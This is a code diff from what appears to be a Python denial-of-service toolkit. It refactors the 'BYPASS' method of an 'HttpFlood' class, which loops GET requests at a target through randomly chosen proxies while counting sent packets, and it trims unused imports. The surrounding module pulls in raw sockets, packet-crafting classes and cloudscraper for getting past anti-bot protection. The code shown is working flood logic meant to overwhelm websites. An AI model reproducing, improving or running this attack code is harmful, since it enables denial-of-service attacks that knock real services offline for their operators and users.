@@ -3,7 +3,6 @@ from contextlib import suppress
 from itertools import cycle
 from math import log2, trunc
 from os import urandom as randbytes
-from pathlib import Path
 from random import choice
 from secrets import choice as randchoice
 from socket import (
@@ -11,7 +10,6 @@ from socket import (
     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, socket
 )
 from ssl import CERT_NONE, SSLContext, create_default_context
-from subprocess import run, PIPE
 from sys import exit as _exit
 from threading import Event
 from time import sleep, time
@@ -22,7 +20,7 @@ from cloudscraper import create_scraper
 from requests import Response, Session, get, cookies
 from yarl import URL
 
-from PyRoxy import Proxy, ProxyType, Tools as ProxyTools
+from PyRoxy import Proxy, Tools as ProxyTools
 from .ImpactPacket import IP, TCP, UDP, Data
 from .core import cl, logger, ROOT_DIR, Stats
 
@@ -775,21 +773,14 @@ class HttpFlood:
         return packets
 
     def BYPASS(self) -> int:
-        pro = None
+        proxies = None
         if self._proxies:
-            pro = randchoice(self._proxies)
+            proxies = randchoice(self._proxies).asRequest()
         s, packets = None, 0
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
                 if not self._event.is_set(): return 0
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        self._stats.track(1, Tools.sizeOfRequest(res))
-                        packets += 1
-                        continue
-
-                with s.get(self._target.human_repr()) as res:
+                with s.get(self._target.human_repr(), proxies=proxies) as res:
                     self._stats.track(1, Tools.sizeOfRequest(res))
                     packets += 1
         Tools.safe_close(s)
